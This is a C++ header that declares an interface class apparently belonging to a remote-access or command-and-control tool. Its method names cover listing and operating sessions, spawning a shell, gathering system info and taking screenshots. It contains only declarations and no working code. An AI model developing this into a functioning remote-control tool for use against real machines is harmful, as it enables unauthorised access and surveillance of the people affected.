#include <iostream>
#include <string>
#include <cstring>
#include <map>
#include <fstream>
#include <ctime>
#include <vector>
#include "colors.h"
#include "inputs.h"
#include "server.h"

using namespace std;

class INTERFACE{
private:
    string inputSv;
    string sockAddr;
    string current_address;
    int current_descriptor;
    int port;

    COLORS color;
    INPUT inputIf;
    SERVER *middle_face;

public:
    INTERFACE();
    INTERFACE(const string);
    INTERFACE(const int);
    INTERFACE(const string, const int);
    string currentDateTime();
    void setMiddleFace(SERVER*);
    bool checkConnection();
    void listSessions();
    void operateSession(const string input_string);
    void disconnectSession();
    void spawnShell();
    void sysinfoSession();
    void screenshotSession();
    void engage();
};